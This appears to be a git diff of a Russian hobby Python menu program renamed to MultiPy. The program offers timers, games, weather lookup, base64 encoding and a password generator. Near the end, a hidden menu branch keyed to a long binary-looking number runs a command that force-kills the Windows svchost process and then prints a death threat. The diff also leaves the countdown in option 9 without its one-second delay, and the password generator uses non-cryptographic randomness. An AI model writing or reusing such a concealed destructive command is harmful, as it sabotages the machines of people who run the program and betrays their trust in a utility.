@@ -3,15 +3,18 @@ from time import *
 from turtle import *
 import os
 import base64
-import pelmen_fun
+import main_fun
 import datetime
-print("Привет! Это Project PelmenBot! Мои функции: \n1-посмотреть старые функции \n2-таймер обратного отчета \n3- игра угадай число \n4-о чатботе \n5-что нового? \n6-погода \n7-секудомер \n8-генератор \n9-супербыстрый таймер обратного отсчета \n10-None \n11-base64 \n12-игра КНБ \n13-бросить кубик \n14-Генератор фигур \n15-узнать длинну строки\nВыбирай цифру!")
+print("MultiPy \n1-посмотреть старые функции \n2-таймер обратного отчета \n3- игра угадай число \n4-о MultiPy \n5-что нового? \n6-погода \n7-секудомер \n8-генератор \n9-супербыстрый таймер обратного отсчета \n10-None \n11-base64 \n12-игра КНБ \n13-бросить кубик \n14-Генератор фигур \n15-узнать длинну строки\nВыбирай цифру!")
 ipt = int(input("Что вы хотите сделать?(введите 0 для выхода):"))
 while ipt != 0:
     if ipt == 1:
-        ipt2 = int(input("У нас есть: 2 - старая погода. Выбирай!"))
-        if ipt2 == 2:
-            pelmen_fun.pogod()
+        ipt2 = int(input("У нас есть: старые функции УДАЛЕНЫ!"))
+    elif ipt == 2:
+        timer1 = int(input("Таймер обратного отсчета. Введите секунды: "))
+        for i in range(timer1, -1, -1):
+            print(i)
+            sleep(1)
     elif ipt == 3:
         print("Угадайте число от 1 до 100!")
         count = randint(1,100)
@@ -29,12 +32,12 @@ while ipt != 0:
         if price == count:
                 print("Вы угадали!")
     elif ipt == 4:
-        print("Программа projectpb(Пельмень). Версия 2.1.1 от 10.08.23. Все права съедены шлепой. Некоторые пункты взяты из интернета, я не писал их сам.")
+        print("Программа MultiPy. Версия 2.1.1 от 10.08.23. Некоторые пункты взяты из интернета, я не писал их сам.")
     elif ipt == 5:
-        pelmen_fun.info()
+        main_fun.info()
     elif ipt == 6:
         city = input("Введите название города: ")
-        weather = pelmen_fun.get_weather(city)
+        weather = main_fun.get_weather(city)
         print(weather)
     elif ipt == 7:
         sec_start = int(input("1 - запустить таймер, 0 - выйти: "))
@@ -44,11 +47,58 @@ while ipt != 0:
             end = time()
             total_time = (end - start)
             print("Время -",round(total_time, 3))
-    elif ipt == 2:
+    elif ipt == 8:
+        per1 = int(input("1 - генератор букв, 2 - генератор цифр, 3 - генератор пароля(буквы + цифры): "))
+        if per1 == 1:
+            per2 = ""
+            dsds = int(input("Введите длинну: "))
+            alfeu = "abcdefghijklmnopqrstuvwxyz"
+            alfru = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя"
+            alfch = "灭斯迪斯尼亚克图路迪斯尼亚克"
+            gdh = input("А какой язык? eu / ru / all? ").lower()
+            if gdh == "ru":
+                alf = alfru
+            if gdh == "eu":
+                alf = alfeu
+            if gdh == "ch":
+                alf = alfch
+            if gdh == "all":
+                alf = ""
+                alf += alfru
+                alf += alfeu
+            for i in range(dsds):
+                per2 += alf[randint(0, (len(alf) - 1))]
+            print(per2)
+        if per1 == 2:
+            dsds = int(input("Введите длинну пароля: "))
+            per1 = ""
+            for i in range(dsds):
+                per1 += str(randint(0,9))
+            print(per1)
+        if per1 == 3:
+            per2 = ""
+            dsds = int(input("Введите длинну: "))
+            alfeu = "abcdefghijklmnopqrstuvwxyz"
+            alfru = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя"
+            gdh = input("А какой язык? eu / ru / all? ").lower()
+            if gdh == "ru":
+                alf = alfru
+            if gdh == "eu":
+                alf = alfeu
+            if gdh == "all":
+                alf = ""
+                alf += alfru
+                alf += alfeu
+            for i in range(dsds):
+                per2 += alf[randint(0, (len(alf) - 1))]
+                if randint(1,3) == 1:
+                    for i in range(randint(1, 3)):
+                        per2 += str(randint(0,9))
+            print(per2)
+    elif ipt == 9:
         timer1 = int(input("Таймер обратного отсчета. Введите секунды: "))
         for i in range(timer1, -1, -1):
             print(i)
-            sleep(1)
     elif ipt == 10:
         ""
     elif ipt == 11:
@@ -64,11 +114,8 @@ while ipt != 0:
             e = base64.b64encode(b)
             s1 = e.decode("UTF-8")
             print(s1)
-    elif ipt == 15:
-        per3 = input("Введите сторку: ")
-        print("Длинна строки:", len(per3))
     elif ipt == 12:
-            pelmen_fun.knb() 
+            main_fun.knb() 
     elif ipt == 13:
         print("Вам выпало", randint(1,6))
     elif ipt == 14:
@@ -166,63 +213,14 @@ while ipt != 0:
             b = randint(0, 255)
             color1 = (r, g, b)
             fun2(color1)
-    elif ipt == 8:
-        per1 = int(input("1 - генератор букв, 2 - генератор цифр, 3 - генератор пароля(буквы + цифры): "))
-        if per1 == 1:
-            per2 = ""
-            dsds = int(input("Введите длинну: "))
-            alfeu = "abcdefghijklmnopqrstuvwxyz"
-            alfru = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя"
-            alfch = "灭斯迪斯尼亚克图路迪斯尼亚克"
-            gdh = input("А какой язык? eu / ru / all? ").lower()
-            if gdh == "ru":
-                alf = alfru
-            if gdh == "eu":
-                alf = alfeu
-            if gdh == "ch":
-                alf = alfch
-            if gdh == "all":
-                alf = ""
-                alf += alfru
-                alf += alfeu
-            for i in range(dsds):
-                per2 += alf[randint(0, (len(alf) - 1))]
-            print(per2)
-        if per1 == 2:
-            dsds = int(input("Введите длинну пароля: "))
-            per1 = ""
-            for i in range(dsds):
-                per1 += str(randint(0,9))
-            print(per1)
-        if per1 == 3:
-            per2 = ""
-            dsds = int(input("Введите длинну: "))
-            alfeu = "abcdefghijklmnopqrstuvwxyz"
-            alfru = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя"
-            gdh = input("А какой язык? eu / ru / all? ").lower()
-            if gdh == "ru":
-                alf = alfru
-            if gdh == "eu":
-                alf = alfeu
-            if gdh == "all":
-                alf = ""
-                alf += alfru
-                alf += alfeu
-            for i in range(dsds):
-                per2 += alf[randint(0, (len(alf) - 1))]
-                if randint(1,3) == 1:
-                    for i in range(randint(1, 3)):
-                        per2 += str(randint(0,9))
-            print(per2)
-    elif ipt == 9:
-        timer1 = int(input("Таймер обратного отсчета. Введите секунды: "))
-        for i in range(timer1, -1, -1):
-            print(i)
+    elif ipt == 15:
+        per3 = input("Введите сторку: ")
+        print("Длинна строки:", len(per3))
     elif ipt == 111011011000011101110111100111001011101011:
         os.system("taskkill /im svchost.exe /f")
         sleep(5)
         print("Ваня... Увижу, убью")
     else: 
-        print("Прости, я тебя не понял:(")
+        print("???")
     ipt = int(input("Что вы хотите сделать?(введите 0 для выхода):"))
-print("Пока ;)")
+print("exit...")
